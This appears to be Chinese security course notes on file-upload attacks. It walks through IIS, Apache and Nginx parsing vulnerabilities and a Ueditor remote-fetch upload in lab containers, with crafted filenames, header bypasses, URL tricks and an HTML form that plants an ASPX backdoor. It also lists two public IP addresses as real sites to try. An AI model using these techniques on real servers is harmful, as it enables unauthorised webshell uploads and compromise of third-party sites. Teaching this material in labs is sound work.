![1645589734427-e070dd0d-3298-4944-9bfd-c5cf55abdc09.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171419867-769207984.png)

```plain
#知识点：
1、中间件安全问题
2、中间件文件上传解析
3、Web应用编辑器上传

#详细点：
1、检测层面：前端，后端等
2、检测内容：文件头，完整性，二次渲染等
3、检测后缀：黑名单，白名单，MIME检测等
4、绕过技巧：多后缀解析，截断，中间件特性，条件竞争等

#本章课程内容：
1、文件上传-CTF赛题知识点
2、文件上传-中间件解析&编辑器安全
3、文件上传-实例CMS文件上传安全分析

#前置：
后门代码需要用特定格式后缀解析，不能以图片后缀解析脚本后门代码(解析漏洞除外)
如：jpg图片里面有php后门代码，不能被触发，所以连接不上后门
如果要图片后缀解析脚本代码，一般会利用包含漏洞或解析漏洞，还有.user.ini&.htaccess

#实例CMS&平台-中间件解析&编辑器引用
1、中间件配置不当导致文件被恶意解析
2、CMS源码引用外部编辑器实现文件上传
```

- 中间件文件解析-IIS&Apache&Nginx

IIS

```plain
-IIS 6 7 文件名 目录名
1、文件名：x.asp;.x.jpg
2、目录名：x.asp/x.jpg
3、IIS7.X与Nginx解析漏洞一致

访问192.168.199.136:81/upload.asp
登录admin panfei806
验证平台是没有任何问题，但是因为是搭建在IIS6.0的平台，所以发生了这种漏洞

上传文件，抓包
```

![1645575239507-aa248cab-811e-4924-bf64-0e9867ea011b.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171444085-671863753.png)

```plain
上传正常的图片，保存的路径为http://192.168.199.136:81/20222238134313887.gif
发现路径可疑的值filepath=/
修改filepath的值，可以发现
```

![1645575447902-25f789d4-c788-4b13-a217-f091ccd81dfd.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171443879-407470378.png)

```plain
根据IIS的解析漏洞，把filepath的值修改为x.asp;.则filepath=/x.asp;.
```

![1645575533380-8c834da3-b076-4308-b82b-fa6e49756fc5.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171444024-2138064984.png)

```plain
发现图片地址变成为http://192.168.199.136:81/x.asp;.20222238184089551.gif
访问这个地址，就可以从触发asp的代码。
```

![1645576004256-c34d8a9f-a5fc-414b-9bfb-95b152b9e813.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171443162-1741469889.png)

```plain
修改filepath的值，同样也适用于目录的漏洞解析 filepath=/x.asp/
```

![1645576237258-1b1750f2-f695-473a-821f-af99b412f044.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171443360-1598473887.png)

```plain
访问http://192.168.199.136:81/x.asp/20222238295688388.jpg
但是连接不成功，登上去服务器也没有发现这个x.asp的目录
那个怎么利用这个解析漏洞呢
条件：
1.是这个中间件
2.上传文件能不能修改上传目录或者上传的文件名能增加命名
如果上传的文件名是固定的，而且目录也没办法创建，那么这个漏洞就没有用处。

命名格式：基于本地名命名，基于时间命名，基于随机字符命名
```

Apache

# Apache HTTPD 换行解析漏洞（CVE-2017-15715）

```plain
启动环境：
cd vulhub-master/
cd httpd/CVE-2017-15715/
sudo docker-compose build
suod docker-compose up -d

访问了对应的ip地址跟端口，但是页面什么都没有。

sudo docker-compose down
wp:https://vulhub.org/#/environments/httpd/CVE-2017-15715/
上传的时候在name后面加上/0a
访问的时候，访问后面加上%0a

这个漏洞利用条件：
条件：
1.是这个中间件
2.黑名单验证（在黑名答案的后缀不让上传php,jsp脚本）
白名单可能不行（在白名单里面才能上传 jpg png gif）

为什么说白名单可能不行呢，因为如果上传1.jpg.php%0a的话，如果没有考虑最后一个点为后缀，这个白名单就可以进行绕过。

php%0a绕过黑名单，这个后缀是不是也能正常解析脚本代码（但是绕过不了phpp%0a白名单）
```

# Apache HTTPD 多后缀解析漏洞

```plain
启动环境：
cd apache_parsing_vulnerability/
sudo docker-compose up -d
启动完成
```

![1645581376800-28cca0c8-fcf3-4e7e-a92d-508d9fff64a1.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171443416-1483571780.png)

```plain
访问地址 http://192.168.199.129/
上传一个jpg的图片，把图片的名字改为1.php.jpg，发现能上传成功。
```

![1645581605937-5a959058-950d-4ca4-b92c-b285fdf78c80.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171443361-528338137.png)

```plain
访问：http://192.168.199.129/uploadfiles/1.php.jpg
执行出PHPinfo效果。
```

![1645581694205-a223cf38-83a4-4b25-97f5-247b40e794ff.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171443660-1202392463.png)

```plain
如果这个文件保存的文件名是基于时间或者其他命令格式的话，把1.php.jpg命名成2022......655.jpg的话，那么这个漏洞就没有用。
```

Nginx

Nginx 文件名逻辑漏洞（CVE-2013-4547）

```plain
wp:https://vulhub.org/#/environments/nginx/CVE-2013-4547/

启动环境：
cd /vulhub-master/nginx/CVE-2013-4547
sudo docker-compose build
sudo docker-compose up -d

访问http://192.168.199.129:8080/
先来信息收集等：发现是php+nginx搭建的平台。
```

![1645582916411-da59fdac-bd74-46a5-8e6f-5c976b72dced.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171443189-1772524519.png)

```plain
上传一个1.jpg的图片，注意在1.jpg中后面还应该有一个空格
```

![1645583134410-59fb8174-8294-42da-846a-354cf59e19fa.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171443591-151507932.png)

```plain
对图片地址进行访问，因为在访问地址的时候，这个数据包不抓，所以进行访问首页添加地址，
在访问URL中/uploadfiles/11.png   .php
用hex16进制修改20 00 发送数据包即可。
```

![1645583702893-aacce380-0f39-42a5-b70e-f5a9da5f4252.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171443869-419854806.png)

Nginx 解析漏洞复现

```plain
wp:https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/

启动环境，找到相对应目录，一样启动道理

访问http://192.168.199.129，信息收集发现是Nginx和php
上传图片，发现是对文件头进行检测，所以加上GIF89a进行绕过。
```

![1645584627584-c7cfd190-4fbf-4351-8a52-b1e246fd71ad.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171443676-2065208776.png)

```plain
访问图片地址：http://192.168.199.129/uploadfiles/f3ccdd27d2000e3f9255a7e3e2c48800.jpg/*naoenlkf.php
在后面加上/*fnawejnf.php，就可以执行出PHP效果。
```

![1645584748374-e32202f5-e5f5-4147-9216-1463d447a986.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171443893-842277730.png)

```plain
也有一些真是网站：
137.175.110.160
81.69.23.137

条件：
只要是Nginx就可以进行测试。
```

------

- Web应用编辑器-Ueditor文件上传安全

```plain
编辑器是为了方便开发者，进而开发的一个插件。对文件的处理，文件的上传。可以通过自己代码写，也可以通过插件来进行功能的实现。

搭建利用过程：https://www.cnblogs.com/hei-zi/p/13394764.html
太麻烦了。
搭建完成后，构造一个html代码：
<form action="http://192.168.46.139/net/controller.ashx?action=catchimage" enctype="multipart/form-data" method="POST">
<p>shell addr: <input type="text" name="source[]" /></p>
<input type="submit" value="Submit" /> 
</form>

上传一个带有shellcode的图片https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png加上?.aspx
然后在返回的地址里面进行访问，得到后门。
```